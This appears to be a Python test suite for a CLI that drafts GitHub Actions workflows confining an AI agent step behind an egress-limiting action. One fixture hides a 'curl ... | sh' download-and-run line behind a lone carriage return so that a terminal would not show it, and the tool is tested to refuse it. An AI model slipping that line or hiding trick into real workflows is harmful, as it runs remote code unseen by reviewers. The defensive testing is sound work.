"""Exercise the offline draft through the CLI with a catalogue-local release."""
import dataclasses
import unittest
from unittest.mock import patch

from helpers import TempDir, run_cli
from obaaf.catalog import load

SHA = "80db1e68769165c9ecf24e553254fa35d6e168d5"
STEP = """      - name: Review
        env:
          ANTHROPIC_API_KEY: ${{ secrets.MODEL }}
          REVIEW_KEY: ${{ secrets.OTHER }}
        run: claude -p review
"""
WORKFLOW = """on: workflow_dispatch
permissions: {}
jobs:
  review:
    runs-on: ubuntu-24.04
    steps:
"""


class EgressDraftTests(unittest.TestCase):
    def draft(self, root):
        return run_cli("fix", "egress", "--job", "review", root)

    def workflow(self, root, step=STEP):
        directory = root / ".github/workflows"
        directory.mkdir(parents=True)
        path = directory / "review.yml"
        path.write_text(WORKFLOW + step)
        return path

    def test_unlisted_stops_before_reading_path(self):
        cat = load()
        empty = dataclasses.replace(cat, detection={**cat.detection, "egress_action_releases": []})
        with patch("obaaf.fix_egress.load", return_value=empty):
            code, out, _ = self.draft("absent")
        self.assertEqual(code, 0)
        self.assertIn("No released commit", out)

    def test_key_placement_and_real_checker_verdicts(self):
        with TempDir() as root:
            path = self.workflow(root)
            original = path.read_bytes()
            code, out, err = self.draft(root)
            self.assertEqual(code, 0, err)
            self.assertEqual(path.read_bytes(), original)
            for item in (SHA, "model-keys: ANTHROPIC_API_KEY", "env: REVIEW_KEY", "api.anthropic.com",
                         "OBAAF-GHA-005:", "not met", "verified", "denied", "subdomains", "If you adopt", ".invalid", "secrets.OTHER is passed"):
                self.assertIn(item, out)

    def test_install_then_agent_wraps_only_the_agent(self):
        with TempDir() as root:
            self.workflow(root, "      - run: npm install -g @anthropic-ai/claude-code@2.0.0\n" + STEP)
            code, out, err = self.draft(root)
            self.assertEqual(code, 0, err)
            self.assertIn("- run: npm install -g @anthropic-ai/claude-code@2.0.0", out)
            self.assertIn("run: claude -p review", out)

    def test_later_step_needs_split(self):
        with TempDir() as root:
            self.workflow(root, STEP + "      - run: echo completed\n")
            code, out, err = self.draft(root)
            self.assertEqual(code, 0, err)
            self.assertIn("OBAAF-GHA-020: cannot-tell", out)
            # The later step is named among the conditions, not only in the printed job (review of A3a:
            # the sentence about splitting is printed for every job, and the step's text only in the job).
            details = out.split("Conditions still requiring work on the egress action:")[1].split("\n  review:")[0]
            self.assertIn("step 'step 2' can run after it or beside it", details)
        with TempDir() as root:
            self.workflow(root)
            code, out, err = self.draft(root)
            self.assertEqual(code, 0, err)
            self.assertNotIn("Conditions still requiring work", out)
            self.assertIn("OBAAF-GHA-020: fixed", out)

    def test_names_the_action_refuses_are_named_as_it_matches_them(self):
        """Review of A3a: the list matched upper-cased names and only two of the action's rules, so
        `github_pat` was named though the action takes it, and `NODE_OPTIONS` was not, though the action
        refuses it; the checker then verified the draft."""
        step = STEP.replace("          REVIEW_KEY: ${{ secrets.OTHER }}\n",
                            "          NODE_OPTIONS: --x\n          ANTHROPIC_BASE_URL: http://h\n"
                            "          github_pat: ${{ secrets.OTHER }}\n")
        with TempDir() as root:
            self.workflow(root, step)
            code, out, err = self.draft(root)
            self.assertEqual(code, 0, err)
            refused = next(line for line in out.splitlines() if line.startswith("The action refuses"))
            self.assertTrue(refused.endswith(": NODE_OPTIONS, ANTHROPIC_BASE_URL"), refused)
            self.assertIn("OBAAF-GHA-020: new", out)
            self.assertIn("names NODE_OPTIONS under env, a name the action at a listed commit sets", out)
            self.assertIn("env: NODE_OPTIONS ANTHROPIC_BASE_URL github_pat", out)

    def test_a_value_with_a_line_break_is_named(self):
        """Second review pass: the action refuses an env value holding a line break or NUL, and a prompt
        written as a block was drafted without a word."""
        step = STEP.replace("          REVIEW_KEY: ${{ secrets.OTHER }}\n",
                            "          PROMPT: |\n            first line\n            second line\n") \
            .replace("claude -p review", 'claude -p "$PROMPT"')
        with TempDir() as root:
            self.workflow(root, step)
            code, out, err = self.draft(root)
            self.assertEqual(code, 0, err)
            line = next(line for line in out.splitlines() if "line break or NUL" in line)
            self.assertTrue(line.endswith(": PROMPT"), line)
        with TempDir() as root:
            self.workflow(root)
            self.assertNotIn("line break or NUL", self.draft(root)[1])

    def test_characters_that_are_not_printable_are_shown_as_written_or_refused(self):
        """Second review pass of A3a: a direction override or U+0085 was printed as it is, so the printed
        job could read otherwise than the job that was checked. Since #363 the job is printed as it is
        written: an escape stays an escape, and a job that holds such a character itself is refused."""
        for char, escape in (("\u202e", "\\u202E"), ("\x85", "\\N"), ("\u200b", "\\u200B")):
            with self.subTest(escape), TempDir() as root:
                self.workflow(root, STEP.replace("name: Review", f'name: "a{escape}b"'))
                code, out, err = self.draft(root)
                self.assertEqual(code, 0, err)
                self.assertNotIn(char, out)
                self.assertIn(f'name: "a{escape}b"', out)
        # Review of #363: nothing reached the refusal. A comment is printed too, so it counts.
        for name, step in (("override", STEP.replace("claude -p review", "claude -p 'a\u202eb'")),
                           ("zero width", STEP.replace("name: Review", "name: Rev\u200biew")),
                           ("no-break space", STEP.replace("name: Review", "name: Review # a\u00a0b"))):
            with self.subTest(name), TempDir() as root:
                path = self.workflow(root, step)
                original = path.read_bytes()
                code, out, err = self.draft(root)
                self.assertEqual((code, out), (2, ""))
                self.assertIn("non-printable source characters", err)
                self.assertEqual(path.read_bytes(), original)

    def test_a_carriage_return_alone_is_refused(self):
        """Review of #363: YAML reads a lone CR as a line break, and a terminal prints the next line over
        the one before it, so `curl ... | sh` was checked and not shown. CRLF is printed as it is."""
        hidden = ("      - name: Review\n        run: |\n          claude -p review\n"
                  "          curl -s https://example.invalid/p | sh\r"
                  "          # print the review summary for the log reader here\n")
        for name, text in (("in a script", WORKFLOW + hidden),
                           ("every line", (WORKFLOW + STEP).replace("\n", "\r"))):
            with self.subTest(name), TempDir() as root:
                path = self.workflow(root)
                path.write_bytes(text.encode())
                code, out, err = self.draft(root)
                self.assertEqual((code, out), (2, ""))
                self.assertIn("non-printable source characters", err)
                self.assertEqual(path.read_bytes(), text.encode())
        with TempDir() as root:
            path = self.workflow(root)
            path.write_bytes((WORKFLOW + STEP).replace("\n", "\r\n").encode())
            code, out, err = self.draft(root)
            self.assertEqual((code, err), (0, ""))
            job = out[out.index("  review:"):]
            self.assertIn("        uses: Obaaf/OBAAF/actions/egress@" + SHA + "\r\n        with:\r\n", job)
            self.assertNotRegex(job, r"\r(?!\n)|(?<!\r)\n")

    def test_explicit_keys_and_blank_lines(self):
        """Review of #363: an explicit `? run` key gave the YAML reader's own message, and an explicit
        `? jobs` key printed a job that began `: `. A blank line in a moved script gained two spaces."""
        explicit_run = WORKFLOW + "      - name: Review\n        ? run\n        : claude -p review\n"
        explicit_jobs = WORKFLOW.replace("jobs:\n  review:", "? jobs\n: review:") + STEP
        for text in (explicit_run, explicit_jobs):
            with self.subTest(text.splitlines()[-1]), TempDir() as root:
                path = self.workflow(root)
                path.write_text(text)
                code, out, err = self.draft(root)
                self.assertEqual((code, out), (2, ""))
                self.assertIn("review this job by hand", err)
                self.assertNotIn("<unicode string>", err)
        # An explicit key for the job itself still starts its line, and is drafted.
        with TempDir() as root:
            path = self.workflow(root)
            path.write_text(WORKFLOW.replace("  review:\n    runs-on", "  ? review\n  : runs-on") + STEP)
            code, out, err = self.draft(root)
            self.assertEqual((code, err), (0, ""))
            self.assertIn("\n  ? review\n  : runs-on: ubuntu-24.04\n", out)
        # The inserted lines end as the step's own line does, not as another line of the file.
        with TempDir() as root:
            path = self.workflow(root)
            path.write_bytes(("# header\r\n" + WORKFLOW + STEP).encode())
            code, out, err = self.draft(root)
            self.assertEqual((code, err), (0, ""))
            self.assertNotIn("\r", out[out.index("  review:"):])
        with TempDir() as root:
            self.workflow(root, "      - name: Review\n        run: |+\n          echo a\n\n          claude -p review\n\n"
                                "        env: {}\n")
            code, out, err = self.draft(root)
            self.assertEqual((code, err), (0, ""))
            self.assertIn("          run: |+\n            echo a\n\n            claude -p review\n\n        env: {}\n", out)

    def test_text_outside_the_basic_plane_dates_and_an_empty_env_are_drafted(self):
        """Review of A3a: an emoji was written as two JSON halves YAML reads as two characters, so the
        draft was refused; a date in the job printed every verdict and then refused; `env:` with no value
        was refused."""
        cases = {
            "emoji": STEP.replace("name: Review", "name: \"\U0001F916 Review\"").replace(
                "claude -p review", "claude -p 'review \U0001F600'"),
            "date": STEP.replace("          REVIEW_KEY", "          SINCE: 2026-01-01\n          REVIEW_KEY"),
            "empty env": "      - name: Review\n        env:\n        run: claude -p review\n",
        }
        for name, step in cases.items():
            with self.subTest(name), TempDir() as root:
                path = self.workflow(root, step)
                path.write_text(path.read_text().replace("    steps:", "    env: {RELEASED: 2026-01-02}\n    steps:"))
                original = path.read_bytes()
                code, out, err = self.draft(root)
                self.assertEqual(code, 0, err)
                self.assertEqual(err, "")
                self.assertIn("uses: Obaaf/OBAAF/actions/egress@" + SHA, out)
                self.assertIn("RELEASED: 2026-01-02", out)
                self.assertEqual(path.read_bytes(), original)
                if name == "emoji":
                    self.assertIn('name: "\U0001F916 Review"', out)
                    self.assertIn("run: claude -p 'review \U0001F600'", out)

    def test_a_refusal_prints_nothing_else(self):
        with TempDir() as root:
            self.workflow(root, STEP * 2)
            code, out, err = self.draft(root)
            self.assertEqual((code, out), (2, ""))
            self.assertIn("exactly one", err)
        with TempDir() as root:
            self.workflow(root)
            code, out, err = run_cli("fix", "egress", "--job", "reveiw", root)
            self.assertEqual((code, out), (2, ""))
            self.assertIn("no workflow checked here has a job with the ID 'reveiw'", err)

    def test_a_workflow_file_selects_the_job_and_is_named_from_the_top_folder(self):
        with TempDir() as root:
            path = self.workflow(root)
            path.with_name("second.yml").write_bytes(path.read_bytes())
            self.assertIn("2 workflows", self.draft(root)[2])
            code, out, err = self.draft(str(path))
            self.assertEqual(code, 0, err)
            self.assertIn("Checked on a private copy of '.github/workflows/review.yml', job 'review':", out)
            self.assertIn("OBAAF-GHA-020: fixed", out)

    def test_ambiguous_and_non_run_steps(self):
        with TempDir() as root:
            path = self.workflow(root, STEP * 2)
            self.assertIn("exactly one", self.draft(root)[2])
            path.with_name("second.yml").write_bytes(path.read_bytes())
            self.assertIn("2 workflows", self.draft(root)[2])
        with TempDir() as root:
            self.workflow(root, "      - uses: anthropics/claude-code-action@v1\n")
            self.assertIn("ordinary run step", self.draft(root)[2])

    def test_all_unmet_conditions_are_shown_even_when_checker_summary_is_short(self):
        with TempDir() as root:
            path = self.workflow(root, STEP + "".join(
                f"      - name: follow-{n}\n        run: echo done\n" for n in range(5)))
            path.write_text(path.read_text().replace("ubuntu-24.04", "ubuntu-latest")
                            .replace("permissions: {}", "permissions: {id-token: write, models: read}"))
            code, out, err = self.draft(root)
            self.assertEqual(code, 0, err)
            details = out.split("Conditions still requiring work on the egress action:")[1].split("\n  review:")[0]
            for reason in ("OIDC", "GitHub Models", "ubuntu-latest", "follow-0", "follow-4"):
                self.assertIn(reason, details)

    def test_other_provider_without_model_key(self):
        with TempDir() as root:
            self.workflow(root, STEP.replace("ANTHROPIC_API_KEY", "OTHER_PROVIDER_KEY"))
            code, out, err = self.draft(root)
            self.assertEqual(code, 0, err)
            self.assertIn("env: OTHER_PROVIDER_KEY REVIEW_KEY", out)
            self.assertIn("OBAAF-GHA-020: fixed", out)
            self.assertIn("secrets.MODEL is passed to the command", out)

    def test_named_harness_keeps_source_and_refuses_ambiguous_names(self):
        steps = ("      - uses: actions/checkout@v4 # pin comment\n"
                 "        with: {x: 020}\n"
                 "      - id: harness\n"
                 "        name: Run harness\n"
                 "        env: {COUNT: 1_000, TOKEN_MODE: 0755}\n"
                 "        timeout-minutes: 020\n"
                 "        run: |\n"
                 "          python review.py\n"
                 "      # following step\n"
                 "      - run: echo done\n")
        with TempDir() as root:
            path = self.workflow(root, steps)
            original = path.read_bytes()
            for selector in ("harness", "Run harness"):
                code, out, err = run_cli("fix", "egress", "--job", "review", "--step", selector, root)
                self.assertEqual((code, err), (0, ""))
                job = (WORKFLOW + steps).split("jobs:\n")[1]
                before, after = job.split("        run: |\n          python review.py\n")
                self.assertIn(before + "        uses: ", out)
                self.assertTrue(out.endswith(after))
                self.assertIn("          run: |\n            python review.py\n", out)
            self.assertEqual(original, path.read_bytes())
            path.write_text(WORKFLOW + steps + "      - name: harness\n        run: echo other\n")
            for selector in ("harness", "absent"):
                code, out, err = run_cli("fix", "egress", "--job", "review", "--step", selector, root)
                self.assertEqual((code, out), (2, ""))
                self.assertIn("exactly one step", err)
            # Review of #363: `steps: 5` printed Python's "'int' object is not iterable".
            path.write_text(WORKFLOW.replace("    steps:\n", "    steps: 5\n"))
            code, out, err = run_cli("fix", "egress", "--job", "review", "--step", "harness", root)
            self.assertEqual((code, out), (2, ""))
            self.assertNotIn("object", err)

    def test_flow_job_keeps_trailing_comment_and_excludes_the_next_job(self):
        with TempDir() as root:
            path = self.workflow(root)
            path.write_text("on: workflow_dispatch\njobs:\n"
                            "  review: {runs-on: ubuntu-24.04, steps: [{run: 'claude -p review'}]} # keep me\n"
                            "  other: {runs-on: ubuntu-24.04, steps: [{run: echo other}]}\n")
            code, out, err = self.draft(root)
            self.assertEqual((code, err), (0, ""))
            self.assertTrue(out.endswith("run: 'claude -p review'}}]} # keep me\n"))
            self.assertNotIn("echo other", out)

    def test_no_apply(self):
        self.assertEqual(run_cli("fix", "egress", "--job", "review", "--apply")[0], 2)
